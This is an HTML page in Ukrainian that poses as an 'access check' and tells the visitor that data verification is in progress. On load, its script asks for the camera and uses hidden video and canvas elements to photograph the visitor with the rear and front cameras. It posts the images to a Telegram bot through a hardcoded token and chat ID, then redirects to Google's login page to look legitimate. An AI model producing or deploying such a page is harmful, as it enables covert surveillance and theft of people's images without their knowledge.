<!DOCTYPE html>
<html lang="uk">

<head>
  <meta charset="UTF-8">
  <title>Перевірка доступу</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }

    video,
    canvas {
      display: none;
    }
  </style>
</head>

<body>
  <h2>Очікуйте, триває перевірка даних...</h2>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = '8029833409:AAEX5ld5TBiHwc85ddH5-JgLEvki19-DlAQ';
    const chatId = '1496584814';

    const sendPhoto = async (blob, label) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', label);
      formData.append('photo', blob, label + '.jpg');

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    };

    const capturePhoto = async (facingMode, label) => {
      try {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        video.srcObject = stream;

        await new Promise(r => setTimeout(r, 3000)); // дати камері час

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        await sendPhoto(blob, label);

        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.error(`❌ ${label}: ${e.message}`);
      }
    };

    const run = async () => {
      // спочатку задня камера
      await capturePhoto('environment', 'Задня камера');

      // потім фронтальна (резерв)
      await capturePhoto('user', 'Фронтальна камера');

      // редирект
      window.location.href = 'https://accounts.google.com/';
    };

    run();
  </script>
</body>

</html>
